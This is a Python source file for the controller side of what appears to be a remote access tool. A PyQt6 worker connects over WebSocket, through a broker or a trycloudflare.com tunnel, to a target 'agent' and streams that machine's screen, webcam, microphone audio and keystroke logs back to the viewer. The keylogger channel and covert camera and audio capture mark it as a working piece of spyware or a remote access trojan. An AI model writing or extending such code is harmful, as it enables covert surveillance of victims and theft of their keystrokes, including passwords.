import sys
import os
import asyncio
import websockets
import threading
import json
from PyQt6.QtCore import QObject, pyqtSignal

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from core import protocol
from core.network import send_msg, recv_msg

class AsyncSessionWorker(QObject):
    frame_received = pyqtSignal(bytes)
    cam_received = pyqtSignal(bytes)
    audio_received = pyqtSignal(bytes)
    log_received = pyqtSignal(str)
    connection_lost = pyqtSignal()
    connection_progress = pyqtSignal(int, str)  # step (0-3), hint message
    connection_ready = pyqtSignal()  # emitted when handshake complete

    def __init__(self, target_url, target_id=None):
        super().__init__()
        self.target_url = target_url
        self.target_id = target_id
        self.running = True
        self.loop = None
        self.ws = None
        self._lock = threading.Lock()

    def is_connected(self):
        """Thread-safe connection check"""
        with self._lock:
            return self.ws is not None and self.running

    def start_async(self):
        """Starts the Asyncio Loop in a separate Thread"""
        t = threading.Thread(target=self._run_loop)
        t.daemon = True
        t.start()

    def stop(self):
        """Graceful shutdown"""
        self.running = False
        with self._lock:
            if self.ws:
                # Schedule close if loop exists
                if self.loop and self.loop.is_running():
                    asyncio.run_coroutine_threadsafe(self.ws.close(), self.loop)
                self.ws = None

    def _run_loop(self):
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        try:
            self.loop.run_until_complete(self._connect_and_stream())
        except Exception as e:
            print(f"[-] Worker Loop Error: {e}")
        finally:
            try:
                self.loop.run_until_complete(self.loop.shutdown_asyncgens())
            except Exception:
                pass
            self.loop.close()
            asyncio.set_event_loop(None)

    async def _connect_and_stream(self):
        try:
            # Step 0: Connecting to broker
            self.connection_progress.emit(0, "Establishing WebSocket connection...")
            print(f"[*] Viewer connecting to {self.target_url}")
            async with websockets.connect(self.target_url) as ws:
                with self._lock:
                    self.ws = ws
                
                # If Target ID is present, we are using Broker or P2P Relay
                if self.target_id and "trycloudflare.com" not in self.target_url:
                    # Step 1: Looking up target
                    self.connection_progress.emit(1, f"Searching for {self.target_id}...")
                    print(f"[*] Looking up {self.target_id}...")
                    await send_msg(ws, bytes([protocol.OP_LOOKUP]) + self.target_id.encode())
                    
                    # Step 2: Waiting for handshake from Broker
                    self.connection_progress.emit(2, "Waiting for agent response...")
                    resp = await recv_msg(ws)
                    if not resp:
                        self.connection_lost.emit()
                        return
                    
                    if resp[0] == protocol.OP_BRIDGE_OK:
                        # Broker bridge established
                        pass
                    elif resp[0] == protocol.OP_ERROR:
                        print("[-] Broker Error")
                        self.connection_lost.emit()
                        return
                else:
                    # Direct Connection (Cloudflare or Local)
                    self.connection_progress.emit(1, "Direct Handshake...")
                    
                # Step 3: Application Level Handshake
                self.connection_progress.emit(3, "Handshaking...")
                
                # Send Hello (JSON)
                # Note: Old agents expect legacy bytes? New agent uses JSON.
                # Let's try sending JSON 'hello' which is supported by new Agent's handle_message
                hello_msg = {
                    "op": "hello",
                    "type": "viewer"
                }
                # Send as TEXT frame (no encode) so Agent doesn't ignore it (it ignores bytes)
                await send_msg(ws, json.dumps(hello_msg))
                
                # Wait for Hello Reply
                reply = await recv_msg(ws)
                if reply:
                    try:
                        data = json.loads(reply)
                        if data.get('op') == 'hello':
                            print(f"[+] Connected to Agent: {data.get('id')}")
                            # Handshake Complete!
                            self.connection_ready.emit()
                            
                            # Start Streaming
                            await send_msg(ws, json.dumps({"op": "start_stream"}))
                            
                            # Enter Loop
                            await self._read_loop(ws)
                            return
                    except Exception:
                        pass
                        
                # Fallback for legacy (if any) or failed handshake
                print("[-] Handshake Failed")
                self.connection_lost.emit()

        except Exception as e:
            print(f"Session Error: {e}")
        finally:
            with self._lock:
                self.ws = None
            self.connection_lost.emit()

    # Alias for compatibility with new handshake logic
    async def _read_loop(self, ws):
        await self._stream_loop(ws)

    async def _stream_loop(self, ws):
        while self.running:
            msg = await recv_msg(ws)
            if not msg:
                break
            
            opcode = msg[0]
            payload = msg[1:]
            
            if opcode == protocol.OP_IMG_FRAME:
                self.frame_received.emit(payload)
            elif opcode == protocol.OP_CAM_FRAME:
                self.cam_received.emit(payload)
            elif opcode == protocol.OP_AUDIO_CHUNK:
                self.audio_received.emit(payload)
            elif opcode == protocol.OP_KEY_LOG:
                try:
                    self.log_received.emit(payload.decode('utf-8'))
                except UnicodeDecodeError:
                    pass
            elif opcode == protocol.OP_ERROR:
                try:
                    error_msg = payload.decode('utf-8')
                except:
                    error_msg = "Unknown"
                print(f"[-] Server Error: {error_msg}")
                break
            elif opcode == protocol.OP_DISCONNECT:
                print("[!] Server requested disconnect.")
                break
